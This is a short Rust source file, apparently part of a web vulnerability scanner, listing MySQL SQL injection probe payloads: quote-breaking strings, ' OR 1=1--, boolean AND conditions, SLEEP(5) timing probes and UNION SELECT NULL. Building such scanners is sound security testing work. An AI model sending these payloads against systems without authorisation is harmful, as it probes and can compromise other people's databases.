use crate::scanner::rules::active::sqli::providers::DbProvider;

pub struct MySqlProvider;

impl DbProvider for MySqlProvider {
    fn name(&self) -> &'static str { "MySQL" }
    fn error_payloads(&self) -> Vec<&'static str> { vec!["'", "\"", "' OR 1=1--", "'; SELECT 1--"] }
    fn boolean_payloads(&self) -> Vec<(&'static str, &'static str)> { vec![("true", " AND 1=1"), ("false", " AND 1=2")] }
    fn time_payloads(&self) -> Vec<&'static str> { vec![" AND SLEEP(5)", "' AND SLEEP(5)--"] }
    fn union_payloads(&self) -> Vec<&'static str> { vec![" UNION SELECT NULL", " UNION SELECT NULL,NULL"] }
}
